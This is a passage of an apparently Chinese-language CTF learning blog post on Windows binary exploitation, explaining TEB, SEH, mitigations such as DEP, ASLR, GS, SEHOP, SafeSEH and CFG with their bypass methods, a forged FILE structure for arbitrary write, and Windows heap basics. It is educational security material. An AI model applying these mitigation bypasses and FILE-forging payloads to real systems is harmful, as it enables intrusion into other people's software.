class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r $teb</span><br><span class="line">$teb=00c3a000</span><br><span class="line">0:000&gt; !teb</span><br><span class="line">TEB at 00c3a000</span><br><span class="line">    ExceptionList:        00bbf2a0</span><br><span class="line">    StackBase:            00bc0000</span><br><span class="line">    StackLimit:           00bbd000</span><br><span class="line">    SubSystemTib:         00000000</span><br><span class="line">    FiberData:            00001e00</span><br><span class="line">    ArbitraryUserPointer: 00000000</span><br><span class="line">    Self:                 00c3a000</span><br><span class="line">    EnvironmentPointer:   00000000</span><br><span class="line">    ClientId:             00002d78 . 00003c8c</span><br><span class="line">    RpcHandle:            00000000</span><br><span class="line">    Tls Storage:          01075d60</span><br><span class="line">    PEB Address:          00c37000</span><br><span class="line">    LastErrorValue:       0</span><br><span class="line">    LastStatusValue:      0</span><br><span class="line">    Count Owned Locks:    0</span><br><span class="line">    HardErrorMode:        0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TEB 的开头是一个 NT_TIB 结构，Thread Infomation Block，线程信息块，具体如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dt _nt_tib</span><br><span class="line">ntdll!_NT_TIB</span><br><span class="line">   +0x000 ExceptionList    : Ptr32 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x004 StackBase        : Ptr32 Void  // 线程堆栈顶 </span><br><span class="line">   +0x008 StackLimit       : Ptr32 Void   // 线程堆栈底</span><br><span class="line">   +0x00c SubSystemTib     : Ptr32 Void</span><br><span class="line">   +0x010 FiberData        : Ptr32 Void</span><br><span class="line">   +0x010 Version          : Uint4B</span><br><span class="line">   +0x014 ArbitraryUserPointer : Ptr32 Void</span><br><span class="line">   +0x018 Self             : Ptr32 _NT_TIB   // _NT_TIB结构体的自引用指针</span><br></pre></td></tr></table></figure><p>可以用于泄露栈地址</p><h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>SEH（Structured Exception Handling，结构化异常处理）是 Windows 操作系统中的一种异常处理机制。</p><p>异常处理需要注册异常，即在异常处理链表中添加 <code>_EXCEPTION_REGISTRATION_RECORD</code> 节点</p><p><code>_EXCEPTION_REGISTRATION_RECORD</code> 中的 <code>Next</code> 指向上一个 <code>_EXCEPTION_REGISTRATION_RECORD</code> 结构，<code>Handler</code> 指向异常处理的代码。</p><p><img src="/image/2025-10-4-learning_windows_pwn_1/1759645034590.png" alt="1759645034590"></p><h2 id="常见保护"><a href="#常见保护" class="headerlink" title="常见保护"></a>常见保护</h2><h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><ul><li>类似 Linux 上的 NX 保护，可以理解为内存的可写和可执行不共存。</li><li>绕过方法<ul><li>ROP</li><li>调用 VirtualProtect （类似于 Linux 的 mprotect）</li></ul></li></ul><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><ul><li>TEB&#x2F;PEB&#x2F;heap&#x2F;stack 的基址每次运行程序都会改变</li><li>一些内核相关的 dll 例如 ntdll.dll 和 kernel32.dll 在所有进程中基址相同</li><li>绕过方法<ul><li><p>泄露地址</p><ul><li>一些 dll 的加载基址在所有进程都相同，因此可以在另一个进程中泄露基址。<ul><li>模块加载基址每次重启才会改变，因此只要靶机不重启不必每次运行程序时泄露基址。</li></ul></li></ul></li></ul></li></ul><h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><ul><li>windows 版的 canary</li><li>绕过方法<ul><li>泄露canary值（通过信息泄露漏洞）</li><li>覆盖SEH处理程序指针（利用未受GS保护的SEH）</li></ul></li></ul><h3 id="CheckStackVars"><a href="#CheckStackVars" class="headerlink" title="CheckStackVars"></a>CheckStackVars</h3><p>这个保护是在函数返回前调用 <code>_RTC_CheckStackVars</code> 函数检查栈中的局部变量的前后 4 字节是否被修改，通常在 Debug 版程序中会出现。</p><p>函数在结束时调用了 <code>CheckStackVars</code> ，函数原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">RTC_CheckStackVars</span><span class="params">(<span class="type">void</span> *Esp, _RTC_framedesc *Fd)</span></span><br></pre></td></tr></table></figure><p>这个函数遍历 _RTC_vardesc (保存在 <code>.rdata</code> 段)描述的所有局部变量，检查变量的前后 4 字节是否被修改（即是否不是 0xCCCCCCCC）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTC_vardesc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> addr;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTC_framedesc</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> varCount;</span><br><span class="line">  _RTC_vardesc *variables;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="/image/2025-10-4-learning_windows_pwn_1/1759651314902.png" alt="1759651314902"></p><h3 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h3><p>在 <code>ntdll!RtlDispatchException</code> 中有对 SEH 链表的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">      RtlpGetStackLimits(&amp;StackLimit, &amp;StackBase);</span><br><span class="line">      ExceptionList = NtCurrentTeb()-&gt;NtTib.ExceptionList;</span><br><span class="line">      ProcessInformation = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( ZwQueryInformationProcess((HANDLE)<span class="number">0xFFFFFFFF</span>, ProcessExecuteFlags, &amp;ProcessInformation, <span class="number">4u</span>, <span class="number">0</span>) &lt; <span class="number">0</span> )</span><br><span class="line">        ProcessInformation = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (ProcessInformation &amp; <span class="number">0x40</span>) != <span class="number">0</span> || RtlpIsValidExceptionChain(ExceptionList, StackLimit, StackBase) )<span class="comment">// SEHOP</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_11:</span><br><span class="line">        RegistrationPointerForCheck = ExceptionList;</span><br><span class="line">        NestedRegistration = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( RegistrationPointerForCheck != (_EXCEPTION_REGISTRATION_RECORD *)<span class="number">-1</span> )<span class="comment">// -1 表示 SEH 链结束</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)RegistrationPointerForCheck &lt; StackLimit</span><br><span class="line">            || (<span class="type">unsigned</span> <span class="type">int</span>)&amp;RegistrationPointerForCheck[<span class="number">1</span>] &gt; StackBase<span class="comment">// SEH 节点不在栈中</span></span><br><span class="line">            || ((<span class="type">unsigned</span> __int8)RegistrationPointerForCheck &amp; <span class="number">3</span>) != <span class="number">0</span><span class="comment">// SEH 节点的位置没有 4 字节对齐</span></span><br><span class="line">            || (Handler = RegistrationPointerForCheck-&gt;Handler, (<span class="type">unsigned</span> <span class="type">int</span>)Handler &lt; StackBase)</span><br><span class="line">            &amp;&amp; StackLimit &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)Handler</span><br><span class="line">            || !RtlIsValidHandler(Handler, ProcessInformation, pContext) )<span class="comment">// safeSEH</span></span><br><span class="line">          &#123;</span><br><span class="line">            pExcptRec-&gt;ExceptionFlags |= EXCEPTION_STACK_INVALID;<span class="comment">// EXCEPTION_STACK_INVALID</span></span><br><span class="line">            <span class="keyword">goto</span> DispatchExit;</span><br><span class="line">          &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其中 RtlpIsValidExceptionChain 内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall <span class="title function_">RtlpIsValidExceptionChain</span><span class="params">(</span></span><br><span class="line"><span class="params">        _EXCEPTION_REGISTRATION_RECORD *ExceptionList,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> StackLimit,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> StackBase,</span></span><br><span class="line"><span class="params">        <span class="type">int</span> StackLimita)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> stackBase; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> stackLimit; <span class="comment">// eax</span></span><br><span class="line">  _EXCEPTION_DISPOSITION (__stdcall *Handler)(_EXCEPTION_RECORD *, <span class="type">void</span> *, _CONTEXT *, <span class="type">void</span> *); <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  stackBase = StackBase;</span><br><span class="line">  stackLimit = StackLimit;</span><br><span class="line">  <span class="keyword">while</span> ( ExceptionList != (_EXCEPTION_REGISTRATION_RECORD *)<span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( stackLimit &gt; (<span class="type">unsigned</span> <span class="type">int</span>)ExceptionList )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)ExceptionList &gt;= stackBase - <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)ExceptionList &amp; <span class="number">3</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    Handler = ExceptionList-&gt;Handler;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)Handler &lt; stackBase &amp;&amp; StackLimit &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)Handler )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ExceptionList-&gt;Next == (_EXCEPTION_REGISTRATION_RECORD *)<span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      stackBase = StackBase;</span><br><span class="line">      <span class="keyword">if</span> ( (NtCurrentTeb()-&gt;SameTebFlags &amp; <span class="number">0x200</span>) != <span class="number">0</span> &amp;&amp; Handler != RtlpFinalExceptionHandler )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    stackLimit = (<span class="type">int</span>)&amp;ExceptionList[<span class="number">1</span>];</span><br><span class="line">    ExceptionList = ExceptionList-&gt;Next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要检查 SEH 是否满足如下条件：</p><ul><li>SEH 节点在栈中</li><li>SEH 节点指向的 Handler 不在栈中</li><li>SEH 节点地址 4 字节对齐</li><li>SEH 最后一个节点的 Next 为 -1 且 Handler 为 RtlpFinalExceptionHandler</li><li>SEH 节点的 Next 指向的下一个节点的地址一定大于当前节点</li></ul><p>只要泄露栈地址就可以伪造 SEH 链表绕过 SEHOP 检查(直接修改栈上的SEH节点为SEH异常处理链的最后一块地址)</p><h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>在 <code>ntdll!RtlDispatchException</code> 中调用 <code>RtlIsValidHandler</code> 进一步检查 SEH 链表，伪代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> BOOL <span class="title function_">RtlIsValidHandler</span><span class="params">(handler)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (handler image has a SafeSEH table) &#123; <span class="comment">//检查异常处理程序所在的模块是否包含SafeSEH表（编译时通过/GS选项生成）</span></span><br><span class="line">        <span class="keyword">if</span> (handler found in the table) <span class="comment">//处理程序在表中</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (ExecuteDispatchEnable|ImageDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">// 允许在加载模块内存空间外执行</span></span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a executeable page) &#123;</span><br><span class="line">        <span class="keyword">if</span> (handler is in an image) &#123;  <span class="comment">//Handler 位于一个模块</span></span><br><span class="line">            <span class="keyword">if</span> (image has the IMAGE_DLLCHARACTERISTICS_NO_SEH flag <span class="built_in">set</span>)  <span class="comment">//标志明确表示“本模块不使用 SEH”</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            <span class="keyword">if</span> (image is a .NET assembly whith the ILonly flag <span class="built_in">set</span>) <span class="comment">//该模块是一个纯粹的 .NET 程序集，它的代码不是原生机器码，不能直接作为 SEH 处理程序</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (handler is not in an image) &#123;</span><br><span class="line">            <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (handler is on a non-executable page) &#123; </span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags)</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将 <code>Handler</code> 覆盖指向有 SEH 但没有 SafeSEH 保护的 Image 即可绕过。</p><h3 id="CFG"><a href="#CFG" class="headerlink" title="CFG"></a>CFG</h3><p>即 Control Flow Guard ，为函数指针创建白名单，每次调用前都会检查。</p><p>windows下的是前向CFI：只考略call，jump的直接跳转和间接跳转，没有计算ret的情况，会在每一个跳转间自动插入一小段检查代码，这段代码会去调用一个核心的验证函数 <code>__guard_check_icall_fptr</code></p><p>Windows CFG实现还依赖于bitmap表，bitmap表中的两位与实际地址的16byte一一对应：</p><ul><li>00：该地址范围没有有效的跳转地址</li><li>01：地址范围包含导出抑制表目标</li><li>10：只有16位对其的地址有效（该范围的第一个地址）</li><li>11：地址范围的所有地址均有效</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">LdrpValidateUserCallTarget</span><span class="params">(<span class="type">unsigned</span> __int64 FuncPtr)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 BitMap; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 Offset; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  BitMap = CFGBitMap[FuncPtr &gt;&gt; <span class="number">9</span>];</span><br><span class="line">  Offset = FuncPtr &gt;&gt; <span class="number">3</span>;  <span class="comment">//&amp; 0x3F;</span></span><br><span class="line">  <span class="keyword">if</span> ( (FuncPtr &amp; <span class="number">0xF</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    Offset &amp;= ~<span class="number">1u</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( !_bittest64(&amp;BitMap, Offset) )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_6:</span><br><span class="line">      LdrpHandleInvalidUserCallTarget();</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_5:</span><br><span class="line">    <span class="keyword">if</span> ( _bittest64(&amp;BitMap, Offset | <span class="number">1</span>) )</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !_bittest64(&amp;BitMap, Offset) )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过方法：ROP（利用一些在白名单里的跳转gadget）</p><h3 id="PROCESS-MITIGATION-CHILD-PROCESS-POLICY"><a href="#PROCESS-MITIGATION-CHILD-PROCESS-POLICY" class="headerlink" title="PROCESS_MITIGATION_CHILD_PROCESS_POLICY"></a>PROCESS_MITIGATION_CHILD_PROCESS_POLICY</h3><p><code>PROCESS_MITIGATION_CHILD_PROCESS_POLICY</code> 是Windows操作系统中的一项安全功能。该功能允许管理员指定如何创建子进程以及它们从其父进程继承哪些安全设置。该功能可用于防止子进程继承某些安全设置，例如创建新进程或访问某些系统资源的能力。</p><p>可用于配置 <code>PROCESS_MITIGATION_CHILD_PROCESS_POLICY</code> 的几个选项，包括：</p><ul><li><code>NoChildProcessCreation</code>：防止创建子进程。</li><li><code>ParentProcess</code>：允许子进程继承与其父进程相同的安全设置。</li><li><code>ChildProcessRestricted</code>：将子进程的安全设置限制为其父进程安全设置的子集。</li></ul><p>可使用如下命令查询 <code>PROCESS_MITIGATION_CHILD_PROCESS_POLICY</code> 是否已开启（在管理员权限的 Powershell 中查询）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ProcessMitigation -Name 程序名</span><br></pre></td></tr></table></figure><p>可以使用如下命令开启 <code>ChildProcessRestricted</code> 保护，效果是不能执行 <code>system(&quot;cmd.exe&quot;)</code>，只能 ORW 获取 flag 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ProcessMitigation -Name 程序名 -Enable DisallowChildProcessCreation</span><br></pre></td></tr></table></figure><h2 id="windows-IO-FILE"><a href="#windows-IO-FILE" class="headerlink" title="windows IO_FILE"></a>windows IO_FILE</h2><p>Windows 的 <code>FILE</code> 结构体定义在 <code>ucrtbase.dll</code> 中，其结构体是实际上是 <code>__crt_stdio_stream_data</code>，大小为 0x58 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span> &#123;</span></span><br><span class="line">    _RTL_CRITICAL_SECTION_DEBUG *DebugInfo;</span><br><span class="line">    <span class="type">int</span> LockCount;</span><br><span class="line">    <span class="type">int</span> RecursionCount;</span><br><span class="line">    <span class="type">void</span> *OwningThread;</span><br><span class="line">    <span class="type">void</span> *LockSemaphore;</span><br><span class="line">    <span class="type">unsigned</span> __int64 SpinCount;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">crt_stdio_stream_data</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        FILE _public_file;</span><br><span class="line">        <span class="type">char</span>* _ptr; <span class="comment">// 当前结构指针</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> *_base; <span class="comment">// 输入缓冲区基址</span></span><br><span class="line">    <span class="type">int</span> _cnt; <span class="comment">// 没有被读出的缓冲区剩余大小</span></span><br><span class="line">    <span class="type">int</span> _flags;</span><br><span class="line">    <span class="type">int</span> _file; <span class="comment">// 文件描述符</span></span><br><span class="line">    <span class="type">int</span> _charbuf; <span class="comment">// Local buffer</span></span><br><span class="line">    <span class="type">int</span> _bufsiz; <span class="comment">// buffer size</span></span><br><span class="line">    <span class="type">char</span> *_tmpfname;</span><br><span class="line">    _RTL_CRITICAL_SECTION _lock; <span class="comment">// lock</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>如果要实现任意地址读，<code>fwrite</code>：</p><ul><li>设置 <code>_file</code> 文件描述符为 <code>stdout</code> 输出符</li><li>设置 <code>_flag</code> 为 <code>_IOWRITE | IOBUFFER_USER | _IOUPDATE</code></li><li>设置 <code>_cnt=0</code></li><li>设置 <code>_base&amp; _ptr</code> 指向读取的地址</li><li>设置 <code>_bufsize</code> 为输出的大小</li></ul><p>如果要实现任意地址写，<code>fread</code>：</p><ul><li>设置 <code>_file</code> 文件描述符为 <code>stdin</code> 输出符</li><li>设置 <code>_flag</code> 为 <code>_IOALLOCATED | _IOBUFFER_USER</code></li><li>设置 <code>_cnt=0</code></li><li>设置 <code>_base&amp; _ptr</code> 指向写入的地址</li><li>设置 <code>_bufsize</code> 为输入的大小</li></ul><p>程序在每次执行如下代码时会在进程的<strong>默认堆</strong>中申请一个 0x60 大小的 chunk 并将其填充为 <code>__crt_stdio_stream_data</code> 结构体然后将该结构体地址写入 <code>Stream</code> 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fopen_s(&amp;Stream, <span class="string">&quot;magic.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果我们能够劫持 <code>Stream</code> 指针或者 UAF 修改 <code>__crt_stdio_stream_data</code> 结构体就可以在执行下面这段代码时实现任意地址写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread_s(buffer, size, <span class="number">1u</span>i64, size, Stream);</span><br></pre></td></tr></table></figure><p>具体伪造方式如下，主要操作是把 <code>_base</code> 指向要写入数据的地址，<code>_file</code> 设为 0 即标准输入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fake_FILE = &#x27;&#x27;</span><br><span class="line">fake_FILE += p64(0)  # _ptr</span><br><span class="line">fake_FILE += p64(target_addr)  # _base</span><br><span class="line">fake_FILE += p32(0)  # _cnt</span><br><span class="line">fake_FILE += p32(0x2080)  # _flags</span><br><span class="line">fake_FILE += p32(0)  # _file = stdin(0)</span><br><span class="line">fake_FILE += p32(0)  # _charbuf</span><br><span class="line">fake_FILE += p64(0x200)  # _bufsiz</span><br><span class="line">fake_FILE += p64(0)  # _tmpfname</span><br><span class="line">fake_FILE += p64(0xffffffffffffffff)  # DebugInfo</span><br><span class="line">fake_FILE += p32(0xffffffff)  # LockCount</span><br><span class="line">fake_FILE += p32(0)  # RecursionCount</span><br><span class="line">fake_FILE += p64(0)  # OwningThread</span><br><span class="line">fake_FILE += p64(0)  # LockSemaphore</span><br><span class="line">fake_FILE += p64(0)  # SpinCount</span><br></pre></td></tr></table></figure><h2 id="windows-heap"><a href="#windows-heap" class="headerlink" title="windows heap"></a>windows heap</h2><h3 id="windbg上的堆相关命令"><a href="#windbg上的堆相关命令" class="headerlink" title="windbg上的堆相关命令"></a>windbg上的堆相关命令</h3><p><code>!heap</code> 打印当前进程所有堆</p><p><code>!heap -h</code> 可以查看当前进程所创建的堆空间</p><p><code>!heap -x address</code> 打印包含 address 的堆块的相关信息</p><p><code>!heap -i address</code> 显示 address 对应堆块的详细信息</p><p><code>!heap -v address</code> 检查堆是否损坏，address 为 heap 地址。例如伪造 <code>FreeList</code> 链表后可以用这个命令测试是否能通过检查。</p><h3 id="Windows-10下的堆类型"><a href="#Windows-10下的堆类型" class="headerlink" title="Windows 10下的堆类型"></a>Windows 10下的堆类型</h3><ol><li>NT Heap<ul><li>默认的内存管理器</li></ul></li><li>SegmentHeap<ul><li>win10新增的内存管理器</li><li>部分系统程序以及UWP(Universal Windows Platform)使用</li></ul></li></ol><h3 id="windows用户态进程堆"><a href="#windows用户态进程堆" class="headerlink" title="windows用户态进程堆"></a>windows用户态进程堆</h3><p>windows用户态进程的堆空间包含两种类型：</p><ul><li>Process Heap（默认），整个进程共享的堆，它包括两个部分：<ul><li>default heap ，其地址信息会存放于 _PEB 的 ProcessHeap 中，<code>GetProcessHeap()</code> 函数返回的就是这个堆的句柄。</li><li>crtheap(C&#x2F;C++运行时堆)，当你调用 <code>malloc</code>, <code>new</code> 等标准C&#x2F;C++库函数时，你使用的是C&#x2F;C++运行时库（CRT）管理的堆。<strong>CRT在初始化时会调用 <code>HeapCreate</code> 创建一个或多个自己的私有堆</strong>来管理内存，而不是直接使用进程的默认堆。</li></ul></li><li>Private Heap，通过 HeapCreate 创建的堆。</li></ul><h3 id="堆管理常见函数"><a href="#堆管理常见函数" class="headerlink" title="堆管理常见函数"></a>堆管理常见函数</h3><h4 id="HeapCreate"><a href="#HeapCreate" class="headerlink" title="HeapCreate"></a>HeapCreate</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI HANDLE WINAPI <span class="title function_">HeapCreate</span> <span class="params">(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)</span>;</span><br></pre></td></tr></table></figure><ul><li>作用：创建一个新的堆对象。</li><li>参数：<ul><li><code>flOptions</code>：堆的选项标志。可以是以下标志的组合：<ul><li><code>HEAP_GENERATE_EXCEPTIONS</code>：在内存不足时引发异常。</li><li><code>HEAP_NO_SERIALIZE</code>：多线程访问堆时不进行同步。</li></ul></li><li><code>dwInitialSize</code>：堆的初始大小（以字节为单位）。如果为 0 